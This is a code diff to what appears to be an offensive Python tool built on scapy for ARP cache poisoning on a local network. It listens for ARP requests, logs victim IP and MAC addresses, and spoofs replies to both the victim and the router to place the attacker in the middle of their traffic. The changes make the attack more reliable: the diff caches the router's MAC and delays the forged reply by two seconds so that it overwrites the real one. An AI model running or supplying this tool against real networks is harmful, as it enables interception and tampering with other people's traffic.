@@ -126,7 +126,7 @@ def arp_prep_automated(router_ip_, iface_ = "enp0s10") :
 arp_scouting_thread = None
 arp_scouting = True
 def arp_prep_silent(input_iface, router_ip_):
-    global IFACE, ATTACKER_IP, ATTACKER_MAC, arp_scouting_thread, router_ip
+    global IFACE, ATTACKER_IP, ATTACKER_MAC, arp_scouting_thread, router_ip, router_mac
     IFACE = input_iface
     ATTACKER_IP = scapy.get_if_addr(IFACE)
     ATTACKER_MAC = scapy.get_if_hwaddr(IFACE)
@@ -136,6 +136,8 @@ def arp_prep_silent(input_iface, router_ip_):
         router_ip = subnet + '.1' #usually router is at subnet .1
     else:
         router_ip = router_ip_
+
+    router_mac = get_mac(router_ip) #is better than getting it during attack
 
     arp_scouting_thread = threading.Thread(target=arp_silent)
     arp_scouting_thread.daemon = True
@@ -155,14 +157,15 @@ def arp_scout_callback(packet):
             return
         
         requestor_ip = None
-        if packet[scapy.ARP].op == 1:
-            requestor_ip = packet[scapy.ARP].psrc
-            victim_addresses[requestor_ip] = src_mac
-        elif packet[scapy.ARP].op == 2:
-            requestor_ip = packet[scapy.ARP].pdst
-            victim_addresses[requestor_ip] = dst_mac
-        else :
-            return #?
+        if  not packet[scapy.ARP].op == 1:
+            return
+        
+        requestor_ip = packet[scapy.ARP].psrc
+        victim_addresses[requestor_ip] = src_mac
+
+        #do not answer immediatly after router does (when victim broadcasts)
+        if dst_mac == ATTACKER_MAC:
+            time.sleep(2.0) #send after 2s to overwrite
 
         arp_spoof(requestor_ip, router_ip)
         arp_spoof(router_ip, requestor_ip)
